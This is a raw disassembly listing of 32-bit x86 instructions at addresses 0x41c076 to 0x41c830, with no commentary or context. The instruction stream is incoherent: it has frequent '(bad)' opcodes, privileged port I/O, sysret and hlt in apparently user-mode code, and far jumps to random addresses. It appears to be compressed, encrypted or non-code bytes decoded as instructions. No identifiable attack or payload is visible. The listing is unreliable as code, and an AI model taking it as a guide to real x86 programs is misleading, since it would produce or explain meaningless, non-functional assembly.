  41c076:	popa   
  41c077:	loopne 0x41c079
  41c079:	adc    al,0xfc
  41c07b:	jmp    FWORD PTR [esi-0xbf2315]
  41c081:	pop    edi
  41c082:	popa   
  41c083:	aad    0xb1
  41c085:	add    al,0xf3
  41c087:	test   ah,ah
  41c089:	add    eax,0x8439c9b0
  41c08e:	jl     0x41c072
  41c090:	jmp    FWORD PTR [edx+esi*2+0x5f1999e2]
  41c097:	pop    ds
  41c098:	shr    DWORD PTR [eax],cl
  41c09a:	xor    DWORD PTR [ebp-0x319be637],ebx
  41c0a0:	and    bl,BYTE PTR [ebx-0xfa9c76a]
  41c0a6:	and    esi,esi
  41c0a8:	mov    bl,0xab
  41c0aa:	add    bh,ah
  41c0ac:	daa    
  41c0ad:	sub    eax,0xf9297746
  41c0b2:	or     ah,BYTE PTR [edi-0x3f]
  41c0b5:	out    dx,al
  41c0b6:	cdq    
  41c0b7:	xchg   ecx,eax
  41c0b8:	dec    esp
  41c0b9:	aaa    
  41c0ba:	shl    DWORD PTR [edx+0x1675e8b4],1
  41c0c0:	fsub   DWORD PTR [edx+0x70]
  41c0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c4:	adc    eax,edi
  41c0c6:	pop    ebx
  41c0c7:	push   ebp
  41c0c8:	aam    0x9f
  41c0ca:	shl    BYTE PTR [esi-0x65],0xa6
  41c0ce:	in     eax,dx
  41c0cf:	jne    0x41c131
  41c0d1:	sub    DWORD PTR [esi-0x267ad3f3],ebx
  41c0d7:	pop    ebp
  41c0d8:	push   esi
  41c0d9:	(bad)  
  41c0da:	loope  0x41c120
  41c0dc:	(bad)  [esi+0x11]
  41c0df:	imul   eax,ebx,0x9
  41c0e2:	cmp    edi,DWORD PTR [ecx]
  41c0e4:	out    dx,eax
  41c0e5:	dec    edx
  41c0e6:	push   ecx
  41c0e7:	sub    al,0x5a
  41c0e9:	mov    ds:0xf4ed6c2,eax
  41c0ee:	jmp    0x94f37a2c
  41c0f3:	data16 (bad) 
  41c0f5:	retf   
  41c0f6:	pop    ebx
  41c0f7:	xchg   esi,eax
  41c0f8:	stc    
  41c0f9:	sbb    bh,ah
  41c0fb:	sub    edi,ecx
  41c0fd:	push   esp
  41c0fe:	or     eax,0x2a809fc8
  41c103:	scas   eax,DWORD PTR es:[edi]
  41c104:	call   0x3f2ef62a
  41c109:	push   ebp
  41c10a:	push   ebx
  41c10c:	mov    esp,0xda6908eb
  41c111:	push   0x5ce89d6f
  41c116:	add    eax,ebx
  41c118:	call   0x4ea1:0x4ffb1fb4
  41c11f:	das    
  41c120:	jnp    0x41c12c
  41c122:	cmp    eax,ebx
  41c124:	sbb    DWORD PTR [edi+0xe],ecx
  41c127:	shl    DWORD PTR [ebp-0x5634b268],1
  41c12d:	sbb    ebx,DWORD PTR [ebx-0x280b4b24]
  41c133:	retf   
  41c134:	mov    ds:0xc73b3ca0,eax
  41c139:	mov    DWORD PTR [edi+0x67],0x5503fcc2
  41c140:	cli    
  41c141:	sub    edi,DWORD PTR [ecx-0x3578ac56]
  41c147:	xor    bh,BYTE PTR [ebp-0x536718ce]
  41c14d:	cwde   
  41c14e:	cdq    
  41c14f:	aad    0xc5
  41c151:	pop    ebp
  41c152:	sub    ah,BYTE PTR [esi-0x1f]
  41c155:	imul   ebp,DWORD PTR ds:0xbc0ed1c4,0x796f41e0
  41c15f:	push   esp
  41c160:	das    
  41c161:	ror    BYTE PTR [edx-0x17a35853],cl
  41c167:	push   edx
  41c168:	jmp    0x41c1a2
  41c16a:	sbb    eax,0x7c412d7
  41c16f:	xor    edi,edx
  41c171:	dec    esi
  41c172:	mov    WORD PTR [edx+0x4a],cs
  41c175:	xchg   esi,eax
  41c176:	je     0x41c0f8
  41c178:	popa   
  41c179:	int3   
  41c17a:	dec    ebx
  41c17b:	dec    eax
  41c17c:	icebp  
  41c17d:	add    DWORD PTR [ebx-0x7e183cda],ebx
  41c183:	or     al,0x7e
  41c185:	out    dx,al
  41c186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c187:	dec    eax
  41c188:	xchg   ecx,eax
  41c189:	sbb    al,BYTE PTR [esp+ebp*8-0x20]
  41c18d:	cmp    cl,BYTE PTR [ecx]
  41c18f:	and    eax,0xcdb5de79
  41c194:	nop
  41c195:	sbb    ch,ch
  41c197:	jmp    0x9a46:0x40487e00
  41c19e:	lds    ebx,FWORD PTR [ecx+0x36fa3668]
  41c1a4:	(bad)  
  41c1a5:	mov    dh,0x68
  41c1a7:	in     eax,0x25
  41c1a9:	cwde   
  41c1aa:	xchg   esi,eax
  41c1ab:	das    
  41c1ac:	loope  0x41c22c
  41c1ae:	loope  0x41c1ae
  41c1b0:	test   BYTE PTR [edi],al
  41c1b2:	or     edx,DWORD PTR [ecx+0x61]
  41c1b5:	leave  
  41c1b6:	leave  
  41c1b7:	xor    eax,0x7394631a
  41c1bc:	or     al,0x15
  41c1be:	pop    edi
  41c1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1c0:	add    BYTE PTR [ecx],0x3e
  41c1c3:	sbb    DWORD PTR [eax],eax
  41c1c5:	or     DWORD PTR [edi+0x72c83566],ecx
  41c1cb:	loopne 0x41c201
  41c1cd:	sbb    BYTE PTR [ebp-0x10b01ee6],ch
  41c1d3:	(bad)  
  41c1d4:	sahf   
  41c1d5:	shl    edi,cl
  41c1d7:	xor    al,0x7a
  41c1d9:	xchg   esp,eax
  41c1da:	call   0x4ceb:0xe60478a7
  41c1e1:	sbb    BYTE PTR [edx],0x5
  41c1e4:	in     eax,dx
  41c1e5:	cli    
  41c1e6:	ins    BYTE PTR es:[edi],dx
  41c1e7:	cmp    eax,DWORD PTR [ebp+esi*1-0x334fad1b]
  41c1ee:	jge    0x41c20b
  41c1f0:	scas   eax,DWORD PTR es:[edi]
  41c1f1:	xlat   BYTE PTR ds:[ebx]
  41c1f2:	sbb    ah,ch
  41c1f4:	pop    edx
  41c1f5:	sub    edx,0x1c
  41c1f8:	and    DWORD PTR [eax+0x6ab2c090],edx
  41c1fe:	imul   edi,DWORD PTR [ebp-0x3],0xffffffde
  41c202:	inc    ebx
  41c203:	js     0x41c1d0
  41c205:	cdq    
  41c206:	bnd jae 0x41c22a
  41c209:	dec    esi
  41c20a:	loopne 0x41c264
  41c20c:	nop
  41c20d:	push   ebx
  41c20e:	repnz sbb eax,0xa4b9c5fa
  41c214:	mov    ds:0xf21bac03,eax
  41c219:	dec    edi
  41c21a:	ret    
  41c21b:	add    ebp,DWORD PTR [edi-0x1785a64e]
  41c221:	xchg   ebp,eax
  41c222:	shl    DWORD PTR [edi],0x34
  41c225:	xchg   ecx,eax
  41c226:	orps   xmm7,XMMWORD PTR [edi-0x76]
  41c22a:	cdq    
  41c22b:	xor    eax,0xd20db2f8
  41c230:	sub    ch,bh
  41c232:	push   0xffffff8b
  41c234:	dec    esi
  41c235:	mov    ebx,0x13b5026b
  41c23a:	xchg   esp,eax
  41c23b:	push   esi
  41c23c:	mov    bh,0xba
  41c23e:	ss jmp 0x4e47c51a
  41c244:	push   ds
  41c245:	dec    edx
  41c246:	xor    edx,DWORD PTR [ebx]
  41c248:	pop    edx
  41c249:	test   DWORD PTR [edx+ecx*4-0x6aee3ad2],ebp
  41c250:	xchg   DWORD PTR [edx+esi*2],ecx
  41c253:	ret    
  41c254:	cmp    eax,0xa5686cc4
  41c259:	and    edx,DWORD PTR [eax]
  41c25b:	pop    ss
  41c25c:	outs   dx,DWORD PTR ds:[esi]
  41c25d:	mov    ds:0x45d46c4b,al
  41c262:	adc    DWORD PTR [edi-0x123c1ac3],0x895ba5e1
  41c26c:	adc    eax,0x83d6a5f4
  41c271:	jnp    0x41c221
  41c273:	mov    edx,0xe8f5a387
  41c278:	jnp    0x41c29e
  41c27a:	out    dx,al
  41c27b:	pop    esp
  41c27c:	mov    esi,0x3ba7c95f
  41c281:	xchg   edi,eax
  41c282:	xor    al,0x2e
  41c284:	mov    dh,0xd2
  41c286:	or     al,0xf
  41c288:	dec    ebp
  41c289:	mov    bh,bl
  41c28b:	pop    esi
  41c28c:	mov    bl,BYTE PTR [esi+0x4fde1411]
  41c292:	mov    ecx,0xd305ed7
  41c297:	cmp    DWORD PTR cs:[ebp+esi*8-0x2],ecx
  41c29c:	mov    eax,ds:0xfd3255b5
  41c2a1:	xchg   dl,al
  41c2a3:	mov    edx,0x52114462
  41c2a8:	sub    DWORD PTR [eax-0x4a],0xffffff9f
  41c2ac:	xor    al,0xc1
  41c2ae:	test   DWORD PTR [ebx+0x0],eax
  41c2b1:	loope  0x41c2c5
  41c2b3:	jecxz  0x41c31a
  41c2b5:	pop    ss
  41c2b6:	(bad)  
  41c2b7:	loop   0x41c28d
  41c2b9:	pushf  
  41c2ba:	js     0x41c33a
  41c2bc:	lods   eax,DWORD PTR ds:[esi]
  41c2bd:	pop    eax
  41c2be:	fcmovnu st,st(7)
  41c2c0:	mov    dl,0xb
  41c2c2:	inc    ebx
  41c2c3:	mov    ds:0x2d128a12,eax
  41c2c8:	inc    eax
  41c2c9:	jnp    0x41c250
  41c2cb:	das    
  41c2cc:	jae    0x41c31e
  41c2ce:	xchg   ebp,eax
  41c2cf:	and    eax,0x8d416f4f
  41c2d4:	mov    bh,BYTE PTR [ebp-0x47143ac1]
  41c2da:	xor    ebx,DWORD PTR [ebp-0x55]
  41c2dd:	ja     0x41c357
  41c2df:	mov    eax,0xb26f755
  41c2e4:	push   esp
  41c2e5:	nop
  41c2e6:	xor    dl,BYTE PTR [ecx+0x46aba618]
  41c2ec:	sub    edx,DWORD PTR [edi-0x16]
  41c2ef:	ins    BYTE PTR es:[edi],dx
  41c2f0:	gs mov edi,0x6d0c0962
  41c2f6:	les    edx,FWORD PTR [ebp-0x74]
  41c2f9:	std    
  41c2fa:	or     al,0x13
  41c2fc:	fnstenv [ebp-0x6c64b6e9]
  41c302:	dec    ebp
  41c303:	xchg   ebp,eax
  41c304:	cdq    
  41c305:	xchg   ecx,eax
  41c306:	cwde   
  41c307:	add    al,0xb4
  41c309:	adc    DWORD PTR [ebx-0x7fe884ae],esi
  41c30f:	mov    ds:0x1d02f315,al
  41c314:	leave  
  41c315:	xor    dl,BYTE PTR ds:[ebx-0x6f1c5694]
  41c31c:	fidiv  DWORD PTR [ebx+0x47fdb619]
  41c322:	push   esi
  41c323:	loopne 0x41c38e
  41c325:	dec    esi
  41c326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c327:	mov    edi,DWORD PTR [esi]
  41c329:	std    
  41c32a:	xor    DWORD PTR [ebx+0x6c06f7cc],esi
  41c330:	push   ebp
  41c331:	das    
  41c332:	push   0x7bbdde26
  41c337:	popf   
  41c338:	push   ss
  41c339:	popa   
  41c33a:	stos   DWORD PTR es:[edi],eax
  41c33b:	dec    eax
  41c33c:	cmp    al,0xf9
  41c33e:	xchg   BYTE PTR [edi],cl
  41c340:	dec    eax
  41c341:	xchg   BYTE PTR [ebp-0x76869b21],al
  41c347:	pop    esp
  41c348:	add    ch,BYTE PTR [ecx+0x32]
  41c34b:	sbb    BYTE PTR [ecx+0x3d],0x40
  41c34f:	rcr    edi,0xc5
  41c352:	mov    edi,0xf5fb5336
  41c357:	(bad)  
  41c358:	jnp    0x41c394
  41c35a:	stos   DWORD PTR es:[edi],eax
  41c35b:	hlt    
  41c35c:	and    eax,0x81f2fe29
  41c361:	mov    es,WORD PTR [edi-0x50aac111]
  41c367:	xor    ebp,edi
  41c369:	js     0x41c303
  41c36b:	test   eax,esp
  41c36d:	mov    eax,0x718fe82a
  41c372:	xor    DWORD PTR [ecx+eiz*2-0x53e9fa07],ebx
  41c379:	mov    edi,0xa7f72b51
  41c37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c37f:	and    eax,0x5a8c89d6
  41c384:	jmp    0x6b1f7e6a
  41c389:	push   esp
  41c38a:	dec    esp
  41c38b:	pop    ebx
  41c38c:	pop    ebp
  41c38d:	nop
  41c38e:	push   0xdf79362c
  41c393:	add    BYTE PTR [eax-0x76d7402a],bl
  41c399:	add    esi,DWORD PTR [eax-0x2]
  41c39c:	jmp    0x8b08:0xc861c49a
  41c3a3:	sub    bh,ah
  41c3a5:	sahf   
  41c3a6:	(bad)  
  41c3a7:	xchg   edx,eax
  41c3a8:	push   edi
  41c3a9:	rcl    DWORD PTR [ebx+edx*8+0x35d2dfe],0x38
  41c3b1:	mov    fs,WORD PTR [ecx]
  41c3b3:	in     al,dx
  41c3b4:	lea    ebx,[edx-0x250a8640]
  41c3ba:	jo     0x41c402
  41c3bc:	sub    eax,DWORD PTR [edi]
  41c3be:	sar    al,0x3
  41c3c1:	ds mov edx,0x7f9c299f
  41c3c7:	or     DWORD PTR [eax-0x1a],edi
  41c3ca:	mov    bl,0xda
  41c3cc:	jmp    DWORD PTR [ecx+ebp*4+0x8]
  41c3d0:	call   0xa0c5:0x9506aec2
  41c3d7:	ret    0x6452
  41c3da:	in     eax,0x83
  41c3dc:	sub    eax,0x7446139b
  41c3e1:	je     0x41c390
  41c3e3:	fwait
  41c3e4:	mov    dh,0x97
  41c3e6:	mov    cl,0xa5
  41c3e8:	jne    0x41c372
  41c3ea:	xor    eax,0xf7f9c45e
  41c3ef:	maskmovq mm6,(bad)
  41c3f0:	div    DWORD PTR [edi-0x331f1933]
  41c3f6:	push   ds
  41c3f7:	arpl   di,cx
  41c3f9:	pop    ebp
  41c3fa:	lahf   
  41c3fb:	xchg   esp,eax
  41c3fc:	rcl    DWORD PTR [edi+esi*2-0x18],cl
  41c400:	and    al,0xb6
  41c402:	mov    dl,0xfa
  41c404:	cmova  eax,DWORD PTR ds:[ebx+ecx*8+0x529c8e74]
  41c40d:	sbb    eax,0x7c4fe7c4
  41c412:	pop    ds
  41c413:	adc    DWORD PTR [ebx+ecx*8+0x40d035e0],esp
  41c41a:	mov    ah,0x95
  41c41c:	mov    DWORD PTR [ebx+0x78],0x95ac31a4
  41c423:	inc    esi
  41c424:	icebp  
  41c425:	cmp    eax,DWORD PTR [eax-0x6135faeb]
  41c42b:	shl    BYTE PTR [edi+0x70d7a3e9],1
  41c431:	test   BYTE PTR fs:[edi],dh
  41c434:	arpl   WORD PTR [eax-0x67],di
  41c437:	cld    
  41c438:	add    ebx,edx
  41c43a:	push   ebx
  41c43b:	push   edi
  41c43c:	jmp    0x38bf:0xae444add
  41c443:	mov    esi,gs
  41c445:	cmp    eax,0xaacc61ed
  41c44a:	xchg   esi,eax
  41c44b:	add    al,0x97
  41c44d:	cmp    DWORD PTR [edx+edi*2],esi
  41c450:	inc    ecx
  41c451:	icebp  
  41c452:	ss cmp eax,0xf1be4c76
  41c458:	(bad)  
  41c459:	mov    edi,0x100fccb3
  41c45e:	xchg   edx,eax
  41c45f:	sar    esi,0xe6
  41c462:	pop    ebx
  41c463:	ins    BYTE PTR es:[edi],dx
  41c464:	int    0x3f
  41c466:	idiv   ah
  41c468:	jmp    0xf1711c30
  41c46d:	adc    eax,0x30953670
  41c472:	stos   DWORD PTR es:[edi],eax
  41c473:	lods   al,BYTE PTR ds:[esi]
  41c474:	hlt    
  41c475:	iret   
  41c476:	ds push ds
  41c478:	jmp    0xa396:0x597270b3
  41c47f:	and    DWORD PTR [eax+0xe],esi
  41c482:	or     eax,0x5dba724d
  41c487:	retf   0xd407
  41c48a:	pop    esp
  41c48b:	outs   dx,DWORD PTR ds:[esi]
  41c48c:	inc    eax
  41c48d:	dec    ecx
  41c48e:	rol    edx,cl
  41c490:	retf   
  41c491:	sub    eax,0xe1c07546
  41c496:	cmp    BYTE PTR [esi-0x1],bl
  41c499:	pushf  
  41c49a:	adc    eax,0xa0d24fbe
  41c49f:	lea    ebx,[edi+0x722663c4]
  41c4a5:	ins    BYTE PTR es:[edi],dx
  41c4a6:	push   edx
  41c4a7:	(bad)
  41c4ab:	and    DWORD PTR [esi+0x3b08dbcc],0x4e
  41c4b2:	mov    bl,0x15
  41c4b4:	test   BYTE PTR [edi-0x33b79dc7],cl
  41c4ba:	lds    ebx,FWORD PTR [esi+0x8]
  41c4bd:	add    al,BYTE PTR [esi-0x63]
  41c4c0:	lea    edx,[ebx+0x7c]
  41c4c3:	inc    esi
  41c4c4:	xchg   edx,eax
  41c4c5:	mov    esi,0xa953e9c8
  41c4ca:	push   esp
  41c4cb:	or     DWORD PTR [eax],ebp
  41c4cd:	cwde   
  41c4ce:	into   
  41c4cf:	push   eax
  41c4d0:	dec    ecx
  41c4d1:	sbb    dl,BYTE PTR [esi-0x39272807]
  41c4d7:	add    edi,DWORD PTR [ebx-0xf]
  41c4da:	div    DWORD PTR [esi]
  41c4dc:	sub    bh,bl
  41c4de:	pop    eax
  41c4df:	mov    bl,0x55
  41c4e1:	test   eax,edi
  41c4e3:	sub    BYTE PTR [ecx+0x1d2f1629],ch
  41c4e9:	daa    
  41c4ea:	fcmovne st,st(6)
  41c4ec:	or     dl,BYTE PTR [edi]
  41c4ee:	xlat   BYTE PTR ds:[ebx]
  41c4ef:	sbb    BYTE PTR [eax-0x47],bh
  41c4f2:	pop    ebx
  41c4f3:	or     DWORD PTR [edi],0xffffff82
  41c4f6:	or     al,0xd1
  41c4f8:	or     ebp,eax
  41c4fa:	sub    al,0x29
  41c4fc:	repz out dx,eax
  41c4fe:	stos   BYTE PTR es:[edi],al
  41c4ff:	nop
  41c500:	add    edx,DWORD PTR [ebp-0x44]
  41c503:	mov    bh,0x11
  41c505:	push   esp
  41c506:	sub    dl,ah
  41c508:	mov    ds,edi
  41c50a:	xor    edi,DWORD PTR [edi]
  41c50c:	not    DWORD PTR [ecx-0x423675f8]
  41c512:	jne    0x41c56b
  41c514:	or     bl,bh
  41c516:	mov    edx,0x16d3abf5
  41c51b:	in     al,0x18
  41c51d:	mov    ebp,0xa33677b9
  41c522:	and    esp,0xf3a22524
  41c528:	and    BYTE PTR [ebx+0x3fb6bf41],dh
  41c52e:	push   edi
  41c52f:	push   ss
  41c530:	push   0xffffff94
  41c532:	jae    0x41c4dc
  41c534:	cdq    
  41c535:	mov    eax,ds:0x867b6984
  41c53a:	jbe    0x41c54a
  41c53c:	aaa    
  41c53d:	mov    cl,BYTE PTR [edx+edi*8+0x51]
  41c541:	loopne 0x41c4ce
  41c543:	inc    ecx
  41c544:	mov    bh,0xd4
  41c546:	retf   0x50fc
  41c549:	inc    esp
  41c54a:	mov    al,0x6d
  41c54c:	pop    eax
  41c54d:	sahf   
  41c54e:	lea    esi,[edx]
  41c550:	jmp    0x128e:0x8167da80
  41c557:	sbb    DWORD PTR [eax-0x53c399ad],esp
  41c55d:	xchg   esi,eax
  41c55e:	add    esi,DWORD PTR [ebp-0x7b05245e]
  41c564:	vmaxsd xmm7,xmm4,QWORD PTR [ebx]
  41c568:	iret   
  41c569:	int3   
  41c56a:	fidivr DWORD PTR [edi+edi*8]
  41c56d:	and    edi,edx
  41c56f:	xchg   ebp,eax
  41c570:	inc    esi
  41c571:	sub    eax,DWORD PTR [esi-0x29]
  41c574:	push   esi
  41c575:	test   DWORD PTR [edx-0x3fdc5625],esp
  41c57b:	outs   dx,BYTE PTR ds:[esi]
  41c57c:	repnz shr bl,1
  41c57f:	adc    DWORD PTR [ebx-0x68ee2c33],esp
  41c585:	aas    
  41c586:	add    eax,ebx
  41c588:	inc    ecx
  41c589:	das    
  41c58a:	aam    0x85
  41c58c:	das    
  41c58d:	inc    eax
  41c58e:	fistp  QWORD PTR [esi-0x6]
  41c591:	add    cl,cl
  41c593:	inc    esi
  41c594:	mov    BYTE PTR [ebp+0x1c],dh
  41c597:	mov    ebp,0xef256a71
  41c59c:	cld    
  41c59d:	xor    al,BYTE PTR [edx]
  41c59f:	pop    esp
  41c5a0:	(bad)  
  41c5a2:	add    BYTE PTR [edi],ah
  41c5a4:	or     al,al
  41c5a6:	out    0x9a,al
  41c5a8:	push   ecx
  41c5a9:	jo     0x41c609
  41c5ab:	mov    BYTE PTR [ebx],0xc9
  41c5ae:	into   
  41c5af:	nop
  41c5b0:	inc    esi
  41c5b1:	in     al,0xc
  41c5b3:	xchg   ecx,eax
  41c5b4:	fcmove st,st(0)
  41c5b6:	es fwait
  41c5b8:	inc    eax
  41c5b9:	imul   edi,DWORD PTR [edi],0xffffffe7
  41c5bc:	inc    eax
  41c5bd:	and    DWORD PTR [eax-0x33fb4cf0],0x2e
  41c5c4:	pop    ebp
  41c5c5:	sbb    eax,0xd1d714c5
  41c5ca:	(bad)  
  41c5cb:	push   edi
  41c5cc:	mov    ebx,0x5a27e5af
  41c5d1:	jmp    0xe14ba0ba
  41c5d6:	dec    edx
  41c5d7:	stc    
  41c5d8:	jo     0x41c62b
  41c5da:	or     eax,0x99572f10
  41c5df:	dec    eax
  41c5e0:	(bad)  
  41c5e1:	fisubr DWORD PTR [ecx+0x70151939]
  41c5e7:	popa   
  41c5e8:	shl    edx,1
  41c5ea:	jo     0x41c646
  41c5ec:	push   esi
  41c5ed:	shl    BYTE PTR [esi-0x31],0xd1
  41c5f1:	out    dx,eax
  41c5f2:	nop
  41c5f3:	add    eax,0x1877af2e
  41c5f8:	or     ebx,DWORD PTR [eax-0x70]
  41c5fb:	pop    esp
  41c5fc:	dec    edx
  41c5fd:	xchg   esp,eax
  41c5fe:	adc    esp,DWORD PTR [ebx+esi*1+0x13]
  41c602:	pop    edx
  41c603:	push   edx
  41c604:	test   BYTE PTR [edx-0x69],cl
  41c607:	cs dec ebx
  41c609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c60a:	jmp    0xd2d0:0xf6dfa2a1
  41c611:	sbb    al,0x5d
  41c613:	cdq    
  41c614:	dec    eax
  41c615:	cwde   
  41c616:	or     BYTE PTR ds:0x38fa7dde,0x2f
  41c61d:	mov    cl,0x90
  41c61f:	mov    ebp,0xead97494
  41c624:	or     bh,ah
  41c626:	add    ebx,DWORD PTR [ebp+0xc564792]
  41c62c:	lods   al,BYTE PTR ds:[esi]
  41c62d:	xchg   DWORD PTR [eax+0x4c],esi
  41c630:	mov    ebx,0xdc30ef51
  41c635:	repnz mov ecx,0xdcee37c0
  41c63b:	(bad)  
  41c63c:	mov    BYTE PTR [ebp-0x30],bl
  41c63f:	mov    ebx,0xeb47405f
  41c644:	mov    eax,ds:0xb6cedb57
  41c649:	shr    BYTE PTR [eax+0x6d6ce7a5],cl
  41c64f:	shr    DWORD PTR [edx-0x36],0xc2
  41c653:	mov    edi,0xc489b7e5
  41c658:	ret    
  41c659:	xchg   DWORD PTR [eax],ebx
  41c65b:	rol    DWORD PTR [edx-0x31],cl
  41c65e:	push   eax
  41c65f:	mov    eax,edi
  41c661:	cmp    eax,0xc798c005
  41c666:	pop    ebx
  41c667:	mov    ebp,0x9caf089e
  41c66c:	loopne 0x41c616
  41c66e:	cmp    al,0xbc
  41c670:	pop    eax
  41c671:	cbw    
  41c673:	ins    DWORD PTR es:[edi],dx
  41c674:	sysret 
  41c676:	loopne 0x41c5ff
  41c678:	add    esp,DWORD PTR [ecx+eax*4-0x7f05517e]
  41c67f:	sti    
  41c680:	out    dx,al
  41c681:	(bad)  
  41c682:	mov    al,ds:0x949e1b42
  41c687:	pop    esp
  41c688:	jnp    0x41c66f
  41c68a:	pop    esp
  41c68b:	xchg   esi,eax
  41c68c:	out    dx,eax
  41c68d:	jl     0x41c6a2
  41c68f:	test   BYTE PTR [eax+ebx*8+0x32a567fb],dh
  41c696:	mov    DWORD PTR [ebx-0x6dd065c9],esp
  41c69c:	sbb    ecx,DWORD PTR [esi+0x28e01d60]
  41c6a2:	mov    bl,BYTE PTR [ecx]
  41c6a4:	test   al,0xb9
  41c6a6:	sar    DWORD PTR [ecx+ecx*2],cl
  41c6a9:	sub    al,0xe1
  41c6ab:	mov    ecx,DWORD PTR [ebx-0x60]
  41c6ae:	jns    0x41c6fa
  41c6b0:	dec    edx
  41c6b1:	xor    eax,0x3e7f4778
  41c6b6:	or     eax,0xcb6e36f6
  41c6bb:	jecxz  0x41c673
  41c6bd:	adc    dl,BYTE PTR [edi+0x37f01735]
  41c6c3:	imul   edx,DWORD PTR [esi],0x4d
  41c6c6:	fistp  QWORD PTR [ebp-0x6a6ce0c]
  41c6cc:	outs   dx,DWORD PTR ds:[esi]
  41c6cd:	repnz sub eax,0xa142c1ac
  41c6d3:	dec    edi
  41c6d4:	test   al,0xeb
  41c6d6:	cmp    esp,DWORD PTR [eax]
  41c6d8:	mov    ds:0x5db73b0f,eax
  41c6dd:	aam    0x14
  41c6df:	push   ebp
  41c6e0:	jae    0x41c700
  41c6e2:	xor    DWORD PTR [ebx-0x5379ac04],edi
  41c6e8:	ins    DWORD PTR es:[edi],dx
  41c6e9:	mov    eax,DWORD PTR [ecx-0x4d]
  41c6ec:	push   ecx
  41c6ed:	and    ecx,DWORD PTR [edi-0x14]
  41c6f0:	clc    
  41c6f1:	xor    ecx,DWORD PTR [ebx-0x61]
  41c6f4:	test   BYTE PTR [edx],0xd2
  41c6f7:	fldenv [ebx+0x4cc238ae]
  41c6fd:	das    
  41c6fe:	das    
  41c6ff:	test   eax,0xb157f7e6
  41c704:	test   DWORD PTR [ebp-0x67],ebp
  41c707:	add    esi,DWORD PTR [esi-0x5]
  41c70a:	(bad)  
  41c70c:	pop    esp
  41c70d:	mov    ah,dl
  41c70f:	jge    0x41c69b
  41c711:	mov    eax,0x3d723158
  41c716:	loopne 0x41c6eb
  41c718:	shl    BYTE PTR [esp+esi*2+0x6e],1
  41c71c:	ins    BYTE PTR es:[edi],dx
  41c71d:	repz mov ecx,DWORD PTR [esi-0x7d]
  41c721:	jae    0x41c781
  41c723:	retf   0x1f39
  41c726:	or     eax,edx
  41c728:	sahf   
  41c729:	adc    DWORD PTR [ecx],ecx
  41c72b:	mov    ebp,0x4ec0bfc1
  41c730:	jmp    0x6fbcaaac
  41c735:	inc    edi
  41c736:	mov    esp,0x67cd9b79
  41c73b:	jbe    0x41c776
  41c73d:	test   eax,0xcefb1b78
  41c742:	(bad)  
  41c743:	in     eax,dx
  41c744:	and    ch,BYTE PTR [edi-0x4]
  41c747:	mov    ebx,0xd4c2c6cc
  41c74c:	inc    edi
  41c74d:	data16 das 
  41c74f:	mov    eax,0xb3b83fce
  41c754:	out    0x8,eax
  41c756:	jmp    FWORD PTR [ecx+0x77751aae]
  41c75c:	pop    esp
  41c75d:	adc    BYTE PTR [eax+0x26],0xd6
  41c761:	fisub  DWORD PTR [esi+0x7d556222]
  41c767:	mov    ah,0xee
  41c769:	mov    al,BYTE PTR [eax+0x2f]
  41c76c:	mov    ch,0x2c
  41c76e:	fdiv   st(7),st
  41c770:	out    0x6b,eax
  41c772:	mov    eax,?
  41c774:	xlat   BYTE PTR ds:[ebx]
  41c775:	sbb    al,0x1
  41c777:	adc    ebp,esi
  41c779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c77a:	repz das 
  41c77c:	repz dec ebx
  41c77e:	in     eax,0xdf
  41c780:	dec    ebp
  41c781:	jb     0x41c70d
  41c783:	sub    DWORD PTR [eax+0x64c6e702],edi
  41c789:	fldenv [edx]
  41c78b:	js     0x41c772
  41c78d:	xchg   ecx,eax
  41c78e:	ins    DWORD PTR es:[edi],dx
  41c78f:	xchg   BYTE PTR [eax],bh
  41c791:	(bad)  
  41c792:	pop    eax
  41c793:	mul    eax
  41c795:	enter  0xaa1b,0x61
  41c799:	out    dx,al
  41c79a:	mov    ebx,0x8eeff916
  41c79f:	lock or al,0xd0
  41c7a2:	and    BYTE PTR [ebx],cl
  41c7a4:	dec    esi
  41c7a5:	iret   
  41c7a6:	std    
  41c7a7:	in     al,0xaf
  41c7a9:	jnp    0x41c80e
  41c7ab:	rcr    DWORD PTR [edx+ebp*8-0x20206426],cl
  41c7b2:	mov    BYTE PTR [edi+0x1a],al
  41c7b5:	sbb    al,0xd5
  41c7b7:	cmp    edx,eax
  41c7b9:	push   0x37b8fab9
  41c7be:	out    dx,al
  41c7bf:	mov    esp,0x5ffbd1c9
  41c7c4:	retf   0x1d7a
  41c7c7:	mov    esp,0x3f5b19b
  41c7cc:	sbb    ah,BYTE PTR [ecx]
  41c7ce:	test   al,0x23
  41c7d0:	and    dh,BYTE PTR [edi-0x7d5c8a0a]
  41c7d6:	dec    ecx
  41c7d7:	enter  0xbaeb,0xe6
  41c7db:	loopne 0x41c7a5
  41c7dd:	push   esp
  41c7de:	sub    edx,ebx
  41c7e0:	inc    DWORD PTR [edx+0x1f]
  41c7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7e4:	pop    esi
  41c7e5:	push   ebp
  41c7e6:	and    al,0x54
  41c7e8:	test   ah,dl
  41c7ea:	jecxz  0x41c7b8
  41c7ec:	fisttp DWORD PTR [edx-0xe]
  41c7ef:	xor    eax,0xc9219347
  41c7f4:	cmp    esi,DWORD PTR [esi+0x6ee69537]
  41c7fa:	add    al,0xc7
  41c7fc:	mov    edi,0xed91e1b5
  41c801:	push   ebx
  41c802:	or     esp,DWORD PTR fs:[ebp-0x6decf5ce]
  41c809:	pop    es
  41c80a:	cmp    bh,dl
  41c80c:	int    0x1f
  41c80e:	dec    ebx
  41c80f:	es rol DWORD PTR fs:[eax-0x50f41c38],1
  41c817:	xchg   esi,eax
  41c818:	aam    0x11
  41c81a:	pop    ecx
  41c81b:	test   DWORD PTR [edx],ebx
  41c81d:	ins    DWORD PTR es:[edi],dx
  41c81e:	xor    DWORD PTR [ebp-0x48],ecx
  41c821:	aas    
  41c822:	mov    edi,0xea345fd0
  41c827:	or     ah,BYTE PTR [edi+ebx*1-0x12]
  41c82b:	out    0xdc,al
  41c82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c82e:	and    ah,al
  41c830:	shl    esi,cl
